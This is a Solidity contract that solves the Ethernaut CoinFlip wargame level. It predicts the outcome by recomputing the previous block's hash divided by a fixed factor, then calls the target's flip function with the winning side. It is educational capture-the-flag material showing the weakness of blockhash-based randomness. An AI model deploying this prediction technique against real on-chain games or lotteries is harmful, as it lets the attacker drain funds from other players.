// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "./CoinFlip.sol";
import "hardhat/console.sol";

/// @title Contract for hacking CoinFlip.sol in Ethernaut
/// @author Pedro Reyes
/// @notice This contract calls CoinFlip.sol and with the right value (true/false) for always winning
contract HackFlip {
    uint256 lastHash;
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip coinFlipContract;

    constructor(address coinFlipAddress) {
        coinFlipContract = CoinFlip(coinFlipAddress);
    }

    /// @dev Calls CoinFlip.flip method with (true/false) for winning always based on on-chain data
    function flip() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        console.log("Flipping . . .");

        if (lastHash != blockValue) {
            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip >= 1 ? true : false;

            return coinFlipContract.flip(side);
        }

        revert();
    }
}
